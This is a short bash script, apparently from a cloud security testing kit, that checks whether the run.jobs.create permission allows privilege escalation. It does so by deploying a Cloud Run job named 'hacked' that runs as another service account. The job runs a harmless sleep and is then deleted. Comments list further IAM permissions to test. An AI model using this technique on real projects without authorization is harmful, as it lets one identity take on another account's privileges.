#!/bin/bash

source lib/lib.sh


echo "================================================"
echo "Checking run.jobs.create"

#enable_service "container.googleapis.com"


modify_role "run.jobs.create,run.jobs.get,run.jobs.run,run.jobs.update"

gcloud beta run jobs deploy hacked \
--impersonate-service-account="${SERVICE_ACCOUNT_ID}@${PROJECT_ID}.iam.gserviceaccount.com" \
--image=marketplace.gcr.io/google/ubuntu2004 \
--command=bash \
--args="-c,sleep 5" \
--service-account="${ATTACK_SA}@${PROJECT_ID}.iam.gserviceaccount.com" \
--region=us-central1 \
--project=security-devbox --execute-now



# Cleaning
echo "EVEN IF IT COMPLAINS OF NOT HAVING run.executions.get THE JOB IS EXECUTED"
read -p "Press any key to delete scenario... " -n1 -s
echo ""

#gcloud beta composer environments delete privesc-test

#disable_service "composer.googleapis.com"

echo "================================================"

echo "Y" | gcloud beta run jobs delete hacked --region=us-central1

#compute.instances.setIamPolicy
#compute.instances.setServiceAccount	
#compute.instances.osAdminLogin
#compute.instances.osLogin
